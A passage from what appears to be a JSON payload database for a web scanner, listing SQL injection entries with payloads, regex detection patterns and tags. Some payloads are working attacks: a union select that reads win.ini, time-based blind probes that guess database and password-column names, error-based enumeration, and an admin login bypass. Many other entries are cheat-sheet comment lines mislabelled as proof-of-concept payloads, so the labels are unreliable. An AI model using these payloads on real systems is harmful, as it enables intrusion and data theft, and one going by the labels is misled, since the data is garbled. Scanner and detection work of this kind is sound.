      "payload": "+make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "\\+make_set\\(6,@:=0x0a,\\(select\\(1\\)from\\(information_schema\\.columns\\)where@:=make_set\\(511,@,0x3c6c693e,table_name,column_name\\)\\),@\\)",
      "tags": [
        "enumeration"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI -- SQL comment [e7c7f5f8]",
      "payload": "--\tSQL comment",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "\\-\\-\\\tSQL\\ comment",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI -- 'sp_password' was found in the text o [e3710404]",
      "payload": "-- 'sp_password' was found in the text of this event.",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "\\-\\-\\ 'sp_password'\\ was\\ found\\ in\\ the\\ text\\ of\\ this\\ event\\.",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI -- (Only works in MSSQL 2017+) [4e561b51]",
      "payload": "-- (Only works in MSSQL 2017+)",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "\\-\\-\\ \\(Only\\ works\\ in\\ MSSQL\\ 2017\\+\\)",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI -- Change delimiter value such as ', ' t [3608ca98]",
      "payload": "-- Change delimiter value such as ', ' to anything else you want => master, tempdb, model, msdb",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "\\-\\-\\ Change\\ delimiter\\ value\\ such\\ as\\ ',\\ '\\ to\\ anything\\ else\\ you\\ want\\ =>\\ master,\\ tempdb,\\ model,\\ msdb",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI -- Change delimiter value such as ', ' t [7bd3a0f6]",
      "payload": "-- Change delimiter value such as ', ' to anything else you want => trace_xe_action_map, trace_xe_event_map, spt_fallback_db, spt_fallback_dev, spt_fallback_usg, spt_monitor, MSreplication_options  (Only works in MSSQL 2017+)",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "\\-\\-\\ Change\\ delimiter\\ value\\ such\\ as\\ ',\\ '\\ to\\ anything\\ else\\ you\\ want\\ =>\\ trace_xe_action_map,\\ trace_xe_event_map,\\ spt_fallback_db,\\ spt_fallback_dev,\\ spt_fallback_usg,\\ spt_monitor,\\ MSreplication_options\\ \\ \\(Only\\ works\\ in\\ MSSQL\\ 2017\\+\\)",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI -- Enable advanced options [9ca05ecf]",
      "payload": "-- Enable advanced options",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "\\-\\-\\ Enable\\ advanced\\ options",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI -- Enable xp_cmdshell [8a6edab1]",
      "payload": "-- Enable xp_cmdshell",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "\\-\\-\\ Enable\\ xp_cmdshell",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI -- May need CAST(xml2clob(\u2026 AS varchar(5 [d91b1430]",
      "payload": "-- May need CAST(xml2clob(\u2026 AS varchar(500)) to display the result.",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "\\-\\-\\ May\\ need\\ CAST\\(xml2clob\\(\u2026\\ AS\\ varchar\\(500\\)\\)\\ to\\ display\\ the\\ result\\.",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI -- Need to convert to hex to return hash [961334db]",
      "payload": "-- Need to convert to hex to return hashes in MSSQL error message / some version of query analyzer",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "\\-\\-\\ Need\\ to\\ convert\\ to\\ hex\\ to\\ return\\ hashes\\ in\\ MSSQL\\ error\\ message\\ /\\ some\\ version\\ of\\ query\\ analyzer",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI -- Returns all in one xml-formatted stri [7ec61d75]",
      "payload": "-- Returns all in one xml-formatted string",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "\\-\\-\\ Returns\\ all\\ in\\ one\\ xml\\-formatted\\ string",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI -- Returns all in one xml-formatted stri [19eb3b93]",
      "payload": "-- Returns all in one xml-formatted string.",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "\\-\\-\\ Returns\\ all\\ in\\ one\\ xml\\-formatted\\ string\\.",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI -- Same but without repeated elements [0d3052b5]",
      "payload": "-- Same but without repeated elements",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "\\-\\-\\ Same\\ but\\ without\\ repeated\\ elements",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI -- The text has been replaced with this  [28bbb6ce]",
      "payload": "-- The text has been replaced with this comment for security reasons.",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "\\-\\-\\ The\\ text\\ has\\ been\\ replaced\\ with\\ this\\ comment\\ for\\ security\\ reasons\\.",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI -- chain multiple openquery [d956c39e]",
      "payload": "-- chain multiple openquery",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "\\-\\-\\ chain\\ multiple\\ openquery",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI -- create user and give admin privileges [7577ec7f]",
      "payload": "-- create user and give admin privileges",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "\\-\\-\\ create\\ user\\ and\\ give\\ admin\\ privileges",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI -- execute query through the link [523ef1e7]",
      "payload": "-- execute query through the link",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "\\-\\-\\ execute\\ query\\ through\\ the\\ link",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI -- execute shell commands [6bdd2aab]",
      "payload": "-- execute shell commands",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "\\-\\-\\ execute\\ shell\\ commands",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI -- find link [c65e05d1]",
      "payload": "-- find link",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "\\-\\-\\ find\\ link",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI -- for N = 0, 1, 2, \u2026 [a9e90e71]",
      "payload": "-- for N = 0, 1, 2, \u2026",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "\\-\\-\\ for\\ N\\ =\\ 0,\\ 1,\\ 2,\\ \u2026",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI -- for the current DB only [088f4c56]",
      "payload": "-- for the current DB only",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "\\-\\-\\ for\\ the\\ current\\ DB\\ only",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI -- hex encoded payload [7189ee1b]",
      "payload": "-- hex encoded payload",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "\\-\\-\\ hex\\ encoded\\ payload",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI -- list column names and types for maste [f1d2bc01]",
      "payload": "-- list column names and types for master..sometable",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "\\-\\-\\ list\\ column\\ names\\ and\\ types\\ for\\ master\\.\\.sometable",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI -- multiple SELECT statements [0f10f2d9]",
      "payload": "-- multiple SELECT statements",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "\\-\\-\\ multiple\\ SELECT\\ statements",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI -- possible roles: sysadmin, serveradmin [6184e556]",
      "payload": "-- possible roles: sysadmin, serveradmin, dbcreator, setupadmin, bulkadmin, securityadmin, diskadmin, public, processadmin",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "\\-\\-\\ possible\\ roles:\\ sysadmin,\\ serveradmin,\\ dbcreator,\\ setupadmin,\\ bulkadmin,\\ securityadmin,\\ diskadmin,\\ public,\\ processadmin",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI -- updating password with a stacked quer [35229c5c]",
      "payload": "-- updating password with a stacked query",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "\\-\\-\\ updating\\ password\\ with\\ a\\ stacked\\ query",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI -- use xtype = 'V' for views [4eb98d57]",
      "payload": "-- use xtype = 'V' for views",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "\\-\\-\\ use\\ xtype\\ =\\ 'V'\\ for\\ views",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI -- using the stacked query to enable xp_ [c57084a9]",
      "payload": "-- using the stacked query to enable xp_cmdshell",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "\\-\\-\\ using\\ the\\ stacked\\ query\\ to\\ enable\\ xp_cmdshell",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI -- you won't have the output of the quer [f5a50a30]",
      "payload": "-- you won't have the output of the query, redirect it to a file",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "\\-\\-\\ you\\ won't\\ have\\ the\\ output\\ of\\ the\\ query,\\ redirect\\ it\\ to\\ a\\ file",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI ----- PoC: SQLi (time-based blind) ----- [d4357dc8]",
      "payload": "----- PoC: SQLi (time-based blind) -----",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "\\-\\-\\-\\-\\-\\ PoC:\\ SQLi\\ \\(time\\-based\\ blind\\)\\ \\-\\-\\-\\-\\-",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI -1 union select null,(select x from Open [c85b5eab]",
      "payload": "-1 union select null,(select x from OpenRowset(BULK 'C:\\Windows\\win.ini',SINGLE_CLOB) R(x)),null,null",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "\\-1\\ union\\ select\\ null,\\(select\\ x\\ from\\ OpenRowset\\(BULK\\ 'C:\\\\Windows\\\\win\\.ini',SINGLE_CLOB\\)\\ R\\(x\\)\\),null,null",
      "tags": [
        "union"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI -1%27+and+6%3d3+or+1%3d1%2b(SELECT+1+and [ddf50a92]",
      "payload": "-1%27+and+6%3d3+or+1%3d1%2b(SELECT+1+and+ROW(1%2c1)%3e(SELECT+COUNT(*)%2cCONCAT(CHAR(95)%2cCHAR(33)%2cCHAR(64)%2cCHAR(52)%2cCHAR(100)%2cCHAR(105)%2cCHAR(108)%2cCHAR(101)%2cCHAR(109)%2cCHAR(109)%2cCHAR(97)%2c0x3a%2cFLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.COLLATIONS+GROUP+BY+x)a)%2b%27",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "\\-1%27\\+and\\+6%3d3\\+or\\+1%3d1%2b\\(SELECT\\+1\\+and\\+ROW\\(1%2c1\\)%3e\\(SELECT\\+COUNT\\(\\*\\)%2cCONCAT\\(CHAR\\(95\\)%2cCHAR\\(33\\)%2cCHAR\\(64\\)%2cCHAR\\(52\\)%2cCHAR\\(100\\)%2cCHAR\\(105\\)%2cCHAR\\(108\\)%2cCHAR\\(101\\)%2cCHAR\\(109\\)%2cCHAR\\(109\\)%2cCHAR\\(97\\)%2c0x3a%2cFLOOR\\(RAND\\(0\\)\\*2\\)\\)x\\+FROM\\+INFORMATION_SCHEMA\\.COLLATIONS\\+GROUP\\+BY\\+x\\)a\\)%2b%27",
      "tags": [
        "enumeration"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI /* [f779b662]",
      "payload": "/*",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "/\\*",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI /* Cassandra Comment */ [ae59d49a]",
      "payload": "/* Cassandra Comment */",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "/\\*\\ Cassandra\\ Comment\\ \\*/",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI /* MSSQL Comment */ C-style comment [d04c8056]",
      "payload": "/* MSSQL Comment */\tC-style comment",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "/\\*\\ MSSQL\\ Comment\\ \\*/\\\tC\\-style\\ comment",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI /* MYSQL Comment */ C-style comment [39f9ef42]",
      "payload": "/* MYSQL Comment */\tC-style comment",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "/\\*\\ MYSQL\\ Comment\\ \\*/\\\tC\\-style\\ comment",
      "tags": [
        "mysql"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI /* PostgreSQL Comment */ C-style comment [7a75cf1a]",
      "payload": "/* PostgreSQL Comment */\tC-style comment",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "/\\*\\ PostgreSQL\\ Comment\\ \\*/\\\tC\\-style\\ comment",
      "tags": [
        "postgres"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI /* copy out info */ [6e6db878]",
      "payload": "/* copy out info */",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "/\\*\\ copy\\ out\\ info\\ \\*/",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI /* get extent and do some paranoia check [ff3b05b3]",
      "payload": "/* get extent and do some paranoia checks */",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "/\\*\\ get\\ extent\\ and\\ do\\ some\\ paranoia\\ checks\\ \\*/",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI /*! MYSQL Special SQL */ Special SQL [8e996903]",
      "payload": "/*! MYSQL Special SQL */\tSpecial SQL",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "/\\*!\\ MYSQL\\ Special\\ SQL\\ \\*/\\\tSpecial\\ SQL",
      "tags": [
        "mysql"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI /*!12345UNION*/: This means that the wor [916968c2]",
      "payload": "/*!12345UNION*/: This means that the word UNION will be executed as part of the SQL statement if the MySQL version is 12.345 or higher.",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "/\\*!12345UNION\\*/:\\ This\\ means\\ that\\ the\\ word\\ UNION\\ will\\ be\\ executed\\ as\\ part\\ of\\ the\\ SQL\\ statement\\ if\\ the\\ MySQL\\ version\\ is\\ 12\\.345\\ or\\ higher\\.",
      "tags": [
        "mysql"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI /*!31337SELECT*/: Similarly, the word SE [a888fd2a]",
      "payload": "/*!31337SELECT*/: Similarly, the word SELECT will be executed if the MySQL version is 31.337 or higher.",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "/\\*!31337SELECT\\*/:\\ Similarly,\\ the\\ word\\ SELECT\\ will\\ be\\ executed\\ if\\ the\\ MySQL\\ version\\ is\\ 31\\.337\\ or\\ higher\\.",
      "tags": [
        "mysql"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI /*!32302 10*/ Comment for MYSQL version  [16d927d3]",
      "payload": "/*!32302 10*/\tComment for MYSQL version 3.23.02",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "/\\*!32302\\ 10\\*/\\\tComment\\ for\\ MYSQL\\ version\\ 3\\.23\\.02",
      "tags": [
        "mysql"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI 1 AND (SELECT SLEEP(10) FROM DUAL WHERE  [a76180d9]",
      "payload": "1 AND (SELECT SLEEP(10) FROM DUAL WHERE (SELECT table_name FROM information_schema.columns WHERE table_schema=DATABASE() AND column_name LIKE '%pass%' LIMIT 0,1) LIKE '%')#",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "1\\ AND\\ \\(SELECT\\ SLEEP\\(10\\)\\ FROM\\ DUAL\\ WHERE\\ \\(SELECT\\ table_name\\ FROM\\ information_schema\\.columns\\ WHERE\\ table_schema=DATABASE\\(\\)\\ AND\\ column_name\\ LIKE\\ '%pass%'\\ LIMIT\\ 0,1\\)\\ LIKE\\ '%'\\)\\#",
      "tags": [
        "enumeration",
        "time-based"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI 1 AND (SELECT SLEEP(10) FROM DUAL WHERE  [fb5caff6]",
      "payload": "1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '%')#",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "1\\ AND\\ \\(SELECT\\ SLEEP\\(10\\)\\ FROM\\ DUAL\\ WHERE\\ DATABASE\\(\\)\\ LIKE\\ '%'\\)\\#",
      "tags": [
        "time-based"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI 1 AND (SELECT SLEEP(10) FROM DUAL WHERE  [fd8012bc]",
      "payload": "1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'A____')#",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "1\\ AND\\ \\(SELECT\\ SLEEP\\(10\\)\\ FROM\\ DUAL\\ WHERE\\ DATABASE\\(\\)\\ LIKE\\ 'A____'\\)\\#",
      "tags": [
        "time-based"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI 1 AND (SELECT SLEEP(10) FROM DUAL WHERE  [a7f47f7d]",
      "payload": "1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SA___')#",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "1\\ AND\\ \\(SELECT\\ SLEEP\\(10\\)\\ FROM\\ DUAL\\ WHERE\\ DATABASE\\(\\)\\ LIKE\\ 'SA___'\\)\\#",
      "tags": [
        "time-based"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI 1 AND (SELECT SLEEP(10) FROM DUAL WHERE  [46cd8849]",
      "payload": "1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SWA__')#",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "1\\ AND\\ \\(SELECT\\ SLEEP\\(10\\)\\ FROM\\ DUAL\\ WHERE\\ DATABASE\\(\\)\\ LIKE\\ 'SWA__'\\)\\#",
      "tags": [
        "time-based"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI 1 AND (SELECT SLEEP(10) FROM DUAL WHERE  [cb2e2d0d]",
      "payload": "1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SWB__')#",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "1\\ AND\\ \\(SELECT\\ SLEEP\\(10\\)\\ FROM\\ DUAL\\ WHERE\\ DATABASE\\(\\)\\ LIKE\\ 'SWB__'\\)\\#",
      "tags": [
        "time-based"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI 1 AND (SELECT SLEEP(10) FROM DUAL WHERE  [6c35bd1d]",
      "payload": "1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SWI__')#",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "1\\ AND\\ \\(SELECT\\ SLEEP\\(10\\)\\ FROM\\ DUAL\\ WHERE\\ DATABASE\\(\\)\\ LIKE\\ 'SWI__'\\)\\#",
      "tags": [
        "time-based"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI 1 AND (SELECT SLEEP(10) FROM DUAL WHERE  [61f187ef]",
      "payload": "1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SW___')#",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "1\\ AND\\ \\(SELECT\\ SLEEP\\(10\\)\\ FROM\\ DUAL\\ WHERE\\ DATABASE\\(\\)\\ LIKE\\ 'SW___'\\)\\#",
      "tags": [
        "time-based"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI 1 AND (SELECT SLEEP(10) FROM DUAL WHERE  [ba665102]",
      "payload": "1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'S____')#",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "1\\ AND\\ \\(SELECT\\ SLEEP\\(10\\)\\ FROM\\ DUAL\\ WHERE\\ DATABASE\\(\\)\\ LIKE\\ 'S____'\\)\\#",
      "tags": [
        "time-based"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI 1 AND (SELECT SLEEP(10) FROM DUAL WHERE  [c412c09b]",
      "payload": "1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '___')#",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "1\\ AND\\ \\(SELECT\\ SLEEP\\(10\\)\\ FROM\\ DUAL\\ WHERE\\ DATABASE\\(\\)\\ LIKE\\ '___'\\)\\#",
      "tags": [
        "time-based"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI 1 AND (SELECT SLEEP(10) FROM DUAL WHERE  [374b2dd5]",
      "payload": "1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '____')#",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "1\\ AND\\ \\(SELECT\\ SLEEP\\(10\\)\\ FROM\\ DUAL\\ WHERE\\ DATABASE\\(\\)\\ LIKE\\ '____'\\)\\#",
      "tags": [
        "time-based"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI 1 AND (SELECT SLEEP(10) FROM DUAL WHERE  [1ed1507f]",
      "payload": "1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '_____')#",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "1\\ AND\\ \\(SELECT\\ SLEEP\\(10\\)\\ FROM\\ DUAL\\ WHERE\\ DATABASE\\(\\)\\ LIKE\\ '_____'\\)\\#",
      "tags": [
        "time-based"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI 1 and (1,2,3,4) = (SELECT * from db.user [ae521b5a]",
      "payload": "1 and (1,2,3,4) = (SELECT * from db.users UNION SELECT 1,2,3,4 LIMIT 1)\tColumn 'id' cannot be null",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "1\\ and\\ \\(1,2,3,4\\)\\ =\\ \\(SELECT\\ \\*\\ from\\ db\\.users\\ UNION\\ SELECT\\ 1,2,3,4\\ LIMIT\\ 1\\)\\\tColumn\\ 'id'\\ cannot\\ be\\ null",
      "tags": [
        "union"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI 1. Send the following payload to test th [0afb100e]",
      "payload": "1. Send the following payload to test the vulnerability: ```'-(select*from(select+sleep(2)+from+dual)a)--+",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "1\\.\\ Send\\ the\\ following\\ payload\\ to\\ test\\ the\\ vulnerability:\\ ```'\\-\\(select\\*from\\(select\\+sleep\\(2\\)\\+from\\+dual\\)a\\)\\-\\-\\+",
      "tags": [
        "time-based"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI 2. Enter \"*admin' -- -*\" in the admin us [673f70da]",
      "payload": "2. Enter \"*admin' -- -*\" in the admin username field and anything",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "2\\.\\ Enter\\ \"\\*admin'\\ \\-\\-\\ \\-\\*\"\\ in\\ the\\ admin\\ username\\ field\\ and\\ anything",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
